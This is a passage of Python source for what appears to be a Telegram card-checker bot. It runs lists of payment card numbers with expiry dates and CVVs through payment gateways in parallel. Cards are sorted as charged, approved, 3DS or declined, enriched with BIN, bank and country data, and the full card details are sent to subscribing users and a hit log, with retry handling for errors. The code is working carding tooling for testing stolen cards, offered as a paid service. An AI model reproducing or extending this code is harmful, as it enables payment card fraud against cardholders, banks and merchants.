                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["declined"].append(entry)
                db.incr_stat("declined")

            with results_lock:
                progress_idx[0] += 1
                done = progress_idx[0]

            if ACTIVE_JOBS.get(job_id) and is_charged:
                brand, btype, bank, country, level, flag = bin_lookup(cc)
                level_str = f" | {level.upper()}" if level and level not in ("N/A", "/", "UNKNOWN", "") else ""
                hit_text = (
                    f"{sbold('CHARGED')} 💎\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('Card')}: <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
                    f"{sbold('Response')}: {sbold(html.escape(clean))}\n"
                    f"{sbold('Price')}: {sbold(f'${price_val}')}\n"
                    f"{sbold('Gateway')}: {sbold(html.escape(gateway_val))}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('BIN')}: {sbold(f'{brand.upper()} | {btype.upper()}{level_str}')}\n"
                    f"{sbold('Bank')}: {sbold(bank)}\n"
                    f"{sbold('Country')}: {sbold(country)} {flag}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('User')}: <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
                )
                if filters.get("charged"):
                    try:
                        sent = asyncio.run_coroutine_threadsafe(
                            client.send_message(uid, premium_emoji(hit_text), parse_mode='html'), loop).result()
                        asyncio.run_coroutine_threadsafe(
                            client.pin_message(uid, sent.id), loop).result()
                    except:
                        pass
                try:
                    log_text = format_hit_log(gateway_val, clean, price_val, f"<a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]", "💎", "CHARGED")
                    asyncio.run_coroutine_threadsafe(
                        send_hit_log(client, log_text), loop).result()
                except:
                    pass


            if ACTIVE_JOBS.get(job_id) and is_approved:
                brand, btype, bank, country, level, flag = bin_lookup(cc)
                level_str = f" | {level.upper()}" if level and level not in ("N/A", "/", "UNKNOWN", "") else ""
                hit_text = (
                    f"{sbold('APPROVED')} ✅\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('Card')}: <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
                    f"{sbold('Response')}: {sbold(html.escape(clean))}\n"
                    f"{sbold('Price')}: {sbold(f'${price_val}')}\n"
                    f"{sbold('Gateway')}: {sbold(html.escape(gateway_val))}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('BIN')}: {sbold(f'{brand.upper()} | {btype.upper()}{level_str}')}\n"
                    f"{sbold('Bank')}: {sbold(bank)}\n"
                    f"{sbold('Country')}: {sbold(country)} {flag}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('User')}: <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
                )
                if filters.get("approved"):
                    try:
                        asyncio.run_coroutine_threadsafe(
                            client.send_message(uid, premium_emoji(hit_text), parse_mode='html'), loop).result()
                    except:
                        pass
                try:
                    log_text = format_hit_log(gateway_val, clean, price_val, f"<a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]", "✅", "APPROVED")
                    asyncio.run_coroutine_threadsafe(
                        send_hit_log(client, log_text), loop).result()
                except:
                    pass


            if ACTIVE_JOBS.get(job_id) and is_threeds:
                brand, btype, bank, country, level, flag = bin_lookup(cc)
                level_str = f" | {level.upper()}" if level and level not in ("N/A", "/", "UNKNOWN", "") else ""
                hit_text = (
                    f"{sbold('3DS')} ⚡️\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('Card')}: <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
                    f"{sbold('Response')}: {sbold(html.escape(clean))}\n"
                    f"{sbold('Price')}: {sbold(f'${price_val}')}\n"
                    f"{sbold('Gateway')}: {sbold(html.escape(gateway_val))}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('BIN')}: {sbold(f'{brand.upper()} | {btype.upper()}{level_str}')}\n"
                    f"{sbold('Bank')}: {sbold(bank)}\n"
                    f"{sbold('Country')}: {sbold(country)} {flag}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('User')}: <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
                )
                if filters.get("3ds"):
                    try:
                        asyncio.run_coroutine_threadsafe(
                            client.send_message(uid, premium_emoji(hit_text), parse_mode='html'), loop).result()
                    except:
                        pass
                try:
                    log_text = format_hit_log(gateway_val, clean, price_val, f"<a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]", "⚡️", "3DS")
                    asyncio.run_coroutine_threadsafe(
                        send_hit_log(client, log_text), loop).result()
                except:
                    pass


            if ACTIVE_JOBS.get(job_id) and (done % 5 == 0 or done == total):
                try:
                    asyncio.run_coroutine_threadsafe(
                        client.edit_message(chat_id, status_msg.id,
                            build_progress(total, done, results, start_time, fname, plan_display, uid),
                            buttons=stop_kb, parse_mode='html'), loop).result()
                except:
                    pass

        def worker():
            with ThreadPoolExecutor(max_workers=WORKERS) as pool:
                futures = []
                for (cc, mes, ano, cvv) in cards:
                    if not ACTIVE_JOBS.get(job_id):
                        break
                    futures.append(pool.submit(process_one, cc, mes, ano, cvv))
                for f in futures:
                    f.result()
                    if not ACTIVE_JOBS.get(job_id):
                        break

            ACTIVE_JOBS.pop(job_id, None)
            USER_ACTIVE_JOB.pop(uid, None)

            for cat in ["charged", "approved", "3ds"]:
                if not filters.get(cat):
                    results[cat] = []

            done = progress_idx[0]
            try:
                asyncio.run_coroutine_threadsafe(
                    client.edit_message(chat_id, status_msg.id,
                        build_progress(total, done, results, start_time, fname, plan_display, uid, stopped=True)),
                    loop).result()
            except:
                pass
            time.sleep(0.5)

            file_content = build_file(results)
            file_bio = io.BytesIO(file_content.encode('utf-8'))
            file_bio.name = "Results.txt"
            try:
                asyncio.run_coroutine_threadsafe(
                    client.send_file(chat_id, file_bio,
                        caption=build_result(results, start_time, fname, plan_display, uid),
                        parse_mode='html'),
                    loop).result()
            except:
                pass

            def card_block(label, item):
                cc = item[0]
                brand, btype, bank, country, level, flag = bin_lookup(cc)
                price_val = float(item[7]) if len(item) > 7 else 0.0
                price_str = f"{price_val:.2f}"
                level_str = f" | {level.upper()}" if level and level not in ("N/A", "/", "UNKNOWN", "") else ""
                return premium_emoji(
                    f"{sbold(label)}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('Card')}: <code>{item[0]}|{item[1]}|{item[2]}|{item[3]}</code>\n"
                    f"{sbold('Response')}: {html.escape(item[4])}\n"
                    f"{sbold('Price')}: ${price_str}\n"
                    f"{sbold('Gateway')}: {html.escape(item[5])}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('BIN')}: {brand.upper()} | {btype.upper()}{level_str}\n"
                    f"{sbold('Bank')}: {bank}\n"
                    f"{sbold('Country')}: {country}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('User')}: <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
                )



            if results["error"]:
                retry_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
                RETRY_DATA[retry_id] = {
                    "cards": [(e[0], e[1], e[2], e[3]) for e in results["error"]],
                    "prices": price_keys,
                    "notify": filters,
                    "fname": fname,
                    "plan_display": plan_display,
                    "chat_id": chat_id,
                    "uid": uid
                }
                retry_kb = [[Button.inline("𝗥𝗲𝘁𝗿𝘆 𝗘𝗿𝗿𝗼𝗿𝘀", f"retry_{retry_id}", style='primary')]]
                try:
                    asyncio.run_coroutine_threadsafe(
                        client.edit_message(chat_id, status_msg.id,
                            build_progress(total, done, results, start_time, fname, plan_display, uid, stopped=True),
                            buttons=retry_kb, parse_mode='html'), loop).result()
                except:
                    pass

        import asyncio
        t = threading.Thread(target=worker, daemon=True)
        t.start()

    @client.on(events.CallbackQuery(pattern=b'^stop_'))
    async def cb_stop(event):
        await event.answer("𝗦𝘁𝗼𝗽𝗽𝗶𝗻𝗴...")
        jid = event.data.decode()[5:]
        uid = event.sender_id
        if jid in ACTIVE_JOBS:
            ACTIVE_JOBS[jid] = False
            if USER_ACTIVE_JOB.get(uid) == jid:
                USER_ACTIVE_JOB.pop(uid, None)
